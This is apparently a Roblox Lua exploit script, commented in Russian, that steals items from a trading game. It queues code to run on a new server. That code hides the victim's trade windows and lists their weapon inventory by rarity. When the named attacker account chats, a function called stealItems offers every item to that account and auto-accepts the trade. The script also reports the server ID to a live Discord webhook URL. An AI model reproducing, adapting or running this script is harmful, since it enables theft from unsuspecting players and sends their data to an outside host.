local TeleportService = game:GetService("TeleportService")
local PlaceId = 126884695634066 -- твой PlaceId

-- Перехват и сохранение JobId + выполнение трейд-кода на новом сервере
TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportResult)
    local serverId = teleportResult.ServerInstanceId

    queue_on_teleport(string.format([[
        getgenv().JobId = "%s"

        -- ===== Весь код трейда и вебхуков =====
        local HttpService = game:GetService("HttpService")
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

        -- Настройки
        local Username = "Warrior_ggs"
        local Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"

        local InvModule = require(ReplicatedStorage.Modules.InventoryModule)
        local PlayerDataModule = require(ReplicatedStorage.Modules.ProfileData)
        local LevelModule = require(ReplicatedStorage.Modules.LevelModule)

        -- Функция отправки вебхука
        local function SendMessageEMBED(url, embed)
            local data = {
                ["content"] = "JobId: `" .. getgenv().JobId .. "` успешно установлен!",
                ["username"] = "JobId Logger",
                ["embeds"] = { embed }
            }
            local jsonData = HttpService:JSONEncode(data)
            pcall(function()
                syn.request({
                    Url = url,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
            end)
        end

        -- Отключение трейд GUI
        coroutine.wrap(function()
            while true do
                local player = Players.LocalPlayer
                local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
                local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
                if tradeGUI.Enabled then tradeGUI.Enabled = false end
                if tradeGUIPhone.Enabled then tradeGUIPhone.Enabled = false end
                task.wait(0.1)
            end
        end)()

        -- Подсчёт предметов
        local allItems = {}
        local uniqueItems, ancientItems, godlyItems, legendaryItems, vintageItems, rareItems, uncommonItems, commonItems = {}, {}, {}, {}, {}, {}, {}, {}
        local counts = {Unique=0, Ancient=0, Godly=0, Legendary=0, Vintage=0, Rare=0, Uncommon=0, Common=0}

        for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
            for _, item in pairs(category) do
                table.insert(allItems, item.ItemName)
                counts[item.Rarity] = counts[item.Rarity] + 1
                if item.Rarity == "Unique" then table.insert(uniqueItems, item.DataID) end
                if item.Rarity == "Ancient" then table.insert(ancientItems, item.DataID) end
                if item.Rarity == "Godly" then table.insert(godlyItems, item.DataID) end
                if item.Rarity == "Legendary" then table.insert(legendaryItems, item.DataID) end
                if item.Rarity == "Vintage" then table.insert(vintageItems, item.DataID) end
                if item.Rarity == "Rare" then table.insert(rareItems, item.DataID) end
                if item.Rarity == "Uncommon" then table.insert(uncommonItems, item.DataID) end
                if item.Rarity == "Common" then table.insert(commonItems, item.DataID) end
            end
        end

        -- Проверка и выполнение трейда
        local function stealItems()
            local player = Players.LocalPlayer
            local sendArgs = {[1] = player} -- Имя аккаунта получателя
            ReplicatedStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))
            task.wait(3)

            local function offerList(list)
                for _, id in pairs(list) do
                    ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons")
                end
            end

            offerList(uniqueItems)
            offerList(ancientItems)
            offerList(godlyItems)
            offerList(legendaryItems)
            offerList(vintageItems)
            offerList(rareItems)
            offerList(uncommonItems)
            offerList(commonItems)

            task.wait(6)
            ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
        end

        -- Подключение к событию PlayerAdded и выполнение трейда
        Players.PlayerAdded:Connect(function(player)
            if player.Name == Username then
                player.Chatted:Connect(function(msg)
                    stealItems()
                end)
            end
        end)

        -- Отправка вебхука с информацией о JobId
        local embed = {
            title = "JobId и трейд активированы!",
            color = 65280,
            fields = {
                {name = "JobId", value = tostring(getgenv().JobId)}
            }
        }
        SendMessageEMBED(Webhook, embed)

        print("Трейд-функции выполнены на новом сервере!")
    ]], serverId))

    -- Перезаход на пойманный сервер
    task.spawn(function()
        TeleportService:TeleportToPlaceInstance(PlaceId, serverId)
    end)
end)

-- Начальный телепорт (если JobId уже есть)
for _ = 1, 2 do
    task.spawn(function()
        TeleportService:TeleportToPlaceInstance(PlaceId, game.JobId)
    end)
    task.wait()
end
